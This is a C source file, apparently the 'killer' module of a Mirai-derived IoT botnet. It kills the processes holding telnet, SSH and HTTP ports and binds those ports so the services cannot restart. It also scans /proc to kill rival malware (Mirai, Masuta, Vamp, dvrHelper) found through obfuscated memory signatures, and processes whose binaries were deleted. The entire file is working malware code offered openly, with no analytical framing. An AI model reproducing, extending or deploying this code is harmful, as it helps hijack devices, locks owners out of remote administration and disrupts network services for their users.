#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    // Let parent continue on main thread
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

    // Kill telnet service and prevent it from restarting
#ifdef KILLER_REBIND_TELNET
#ifdef DEBUG
    printf("[killer] Trying to kill port 23\n");
#endif
    if (killer_kill_by_port(htons(23)))
    {
#ifdef DEBUG
        printf("[killer] Killed tcp/23 (telnet)\n");
#endif
    } else {
#ifdef DEBUG
        printf("[killer] Failed to kill port 23\n");
#endif
    }
    tmp_bind_addr.sin_port = htons(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#ifdef DEBUG
    printf("[killer] Bound to tcp/23 (telnet)\n");
#endif
#endif

    // Kill SSH service and prevent it from restarting
#ifdef KILLER_REBIND_SSH
    if (killer_kill_by_port(htons(22)))
    {
#ifdef DEBUG
        printf("[killer] Killed tcp/22 (SSH)\n");
#endif
    }
    tmp_bind_addr.sin_port = htons(22);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#ifdef DEBUG
    printf("[killer] Bound to tcp/22 (SSH)\n");
#endif
#endif

    // Kill HTTP service and prevent it from restarting
#ifdef KILLER_REBIND_HTTP
    if (killer_kill_by_port(htons(80)))
    {
#ifdef DEBUG
        printf("[killer] Killed tcp/80 (http)\n");
#endif
    }
    tmp_bind_addr.sin_port = htons(80);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#ifdef DEBUG
    printf("[killer] Bound to tcp/80 (http)\n");
#endif
#endif

    // In case the binary is getting deleted, we want to get the REAL realpath
    sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    if (!has_exe_access())
    {
#ifdef DEBUG
        printf("[killer] Machine does not have /proc/$pid/exe\n");
#endif
        return;
    }
#ifdef DEBUG
    printf("[killer] Memory scanning processes\n");
#endif

    while (TRUE)
    {
        DIR *dir;
        struct dirent *file;

        table_unlock_val(TABLE_KILLER_PROC);
        if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
#ifdef DEBUG
            printf("[killer] Failed to open /proc!\n");
#endif
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);

        while ((file = readdir(dir)) != NULL)
        {
            // skip all folders that are not PIDs
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            char status_path[64], *ptr_status_path = status_path;
            int rp_len, fd, pid = atoi(file->d_name);

            scan_counter++;
            if (pid <= killer_highest_pid)
            {
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
                {
#ifdef DEBUG
                    printf("[killer] %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
#endif
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1); // Sleep so we can wait for another process to spawn
                }

                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_EXE);

            // Store /proc/$pid/exe into exe_path
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));

            // Store /proc/$pid/status into status_path
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_EXE);

            // Resolve exe_path (/proc/$pid/exe) -> realpath
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string

                table_unlock_val(TABLE_KILLER_ANIME);
                // If path contains ".anime" kill.
                if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
                {
                    unlink(realpath);
                    kill(pid, 9);
                }
                table_lock_val(TABLE_KILLER_ANIME);

                // Skip this file if its realpath == killer_realpath
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
#ifdef DEBUG
                    printf("[killer] Process '%s' has deleted binary!\n", realpath);
#endif
                    kill(pid, 9);
                }
                close(fd);
            }

            if (memory_scan_match(exe_path))
            {
#ifdef DEBUG
                printf("[killer] Memory scan match for binary %s\n", exe_path);
#endif
                kill(pid, 9);
            } 


            util_zero(exe_path, sizeof (exe_path));
            util_zero(status_path, sizeof (status_path));

            sleep(1);
        }

        closedir(dir);
    }

#ifdef DEBUG
    printf("[killer] Finished\n");
#endif
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf("[killer] Finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);

    fd = open(table_retrieve_val(TABLE_KILLER_PROC, NULL), O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    // If we failed to find it, lock everything and move on
    if (util_strlen(inode) == 0)
    {
#ifdef DEBUG
        printf("Failed to find inode for port %d\n", ntohs(port));
#endif
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);

        return 0;
    }

#ifdef DEBUG
    printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
#endif

    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
#ifdef DEBUG
                        printf("[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
#else
                        kill(util_atoi(pid, 10), 9);
#endif
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);
    table_lock_val(TABLE_KILLER_TCP);

    return ret;
}

static BOOL has_exe_access(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);

    // Copy /proc/$pid/exe into path
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));

    // Try to open file
    if ((fd = open(path, O_RDONLY)) == -1)
    {
#ifdef DEBUG
        printf("[killer] Failed to open()\n");
#endif
        return FALSE;
    }
    close(fd);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);

    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
#ifdef DEBUG
        printf("[killer] Detected we are running out of `%s`\n", killer_realpath);
#endif
    }

    util_zero(path, ptr_path - path);

    return TRUE;
}

static BOOL memory_scan_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    char *m_route, *m_cpuinfo, *m_bogo, *m_rc, *m_masuta1, *m_masuta2, *m_mirai1, *m_mirai2, *m_vamp1, *m_vamp2, *m_vamp3, *m_dvrhelper;
    int m_route_len, m_cpuinfo_len, m_bogo_len, m_rc_len, m_masuta1_len, m_masuta2_len, m_mirai1_len, m_mirai2_len, m_vamp1_len, m_vamp2_len, m_vamp3_len, m_dvrhelper_len;
    BOOL found = FALSE;

    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_MEM_ROUTE);
	table_unlock_val(TABLE_MEM_CPUINFO);
	table_unlock_val(TABLE_MEM_BOGO);
	table_unlock_val(TABLE_MEM_RC);
	table_unlock_val(TABLE_MEM_MASUTA1);
	table_unlock_val(TABLE_MEM_MASUTA2);
	table_unlock_val(TABLE_MEM_MIRAI1);
	table_unlock_val(TABLE_MEM_MIRAI2);
	table_unlock_val(TABLE_MEM_VAMP1);
	table_unlock_val(TABLE_MEM_VAMP2);
	table_unlock_val(TABLE_MEM_VAMP3);
	table_unlock_val(TABLE_MISC_DVRHELP);


    m_route = table_retrieve_val(TABLE_MEM_ROUTE, &m_route_len);
	m_cpuinfo = table_retrieve_val(TABLE_MEM_CPUINFO, &m_cpuinfo_len);
    m_bogo = table_retrieve_val(TABLE_MEM_BOGO, &m_bogo_len);
    m_rc = table_retrieve_val(TABLE_MEM_RC, &m_rc_len);
    m_masuta1 = table_retrieve_val(TABLE_MEM_MASUTA1, &m_masuta1_len);
	m_masuta2 = table_retrieve_val(TABLE_MEM_MASUTA2, &m_masuta2_len);
	m_mirai1 = table_retrieve_val(TABLE_MEM_MIRAI1, &m_mirai1_len);
	m_mirai2 = table_retrieve_val(TABLE_MEM_MIRAI2, &m_mirai2_len);
	m_vamp1 = table_retrieve_val(TABLE_MEM_VAMP1, &m_vamp1_len);
	m_vamp2 = table_retrieve_val(TABLE_MEM_VAMP2, &m_vamp2_len);
	m_vamp3 = table_retrieve_val(TABLE_MEM_VAMP3, &m_vamp3_len);
	m_dvrhelper = table_retrieve_val(TABLE_MISC_DVRHELP, &m_dvrhelper_len);


    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_route, m_route_len) ||
            mem_exists(rdbuf, ret, m_cpuinfo, m_cpuinfo_len) ||
			mem_exists(rdbuf, ret, m_bogo, m_bogo_len) ||
			mem_exists(rdbuf, ret, m_rc, m_rc_len) ||
			mem_exists(rdbuf, ret, m_masuta1, m_masuta1_len) ||
			mem_exists(rdbuf, ret, m_masuta2, m_masuta2_len) ||
			mem_exists(rdbuf, ret, m_mirai1, m_mirai1_len) ||
			mem_exists(rdbuf, ret, m_mirai2, m_mirai2_len) ||
			mem_exists(rdbuf, ret, m_vamp1, m_vamp1_len) ||
			mem_exists(rdbuf, ret, m_vamp2, m_vamp2_len) ||
			mem_exists(rdbuf, ret, m_vamp3, m_vamp3_len) ||
			mem_exists(rdbuf, ret, m_dvrhelper, m_dvrhelper_len))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_MEM_ROUTE);
	table_lock_val(TABLE_MEM_CPUINFO);
	table_lock_val(TABLE_MEM_BOGO);
	table_lock_val(TABLE_MEM_RC);
	table_lock_val(TABLE_MEM_MASUTA1);
	table_lock_val(TABLE_MEM_MASUTA2);
	table_lock_val(TABLE_MEM_MIRAI1);
	table_lock_val(TABLE_MEM_MIRAI2);
	table_lock_val(TABLE_MEM_VAMP1);
	table_lock_val(TABLE_MEM_VAMP2);
	table_lock_val(TABLE_MEM_VAMP3);
	table_lock_val(TABLE_MISC_DVRHELP);

    close(fd);

    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}
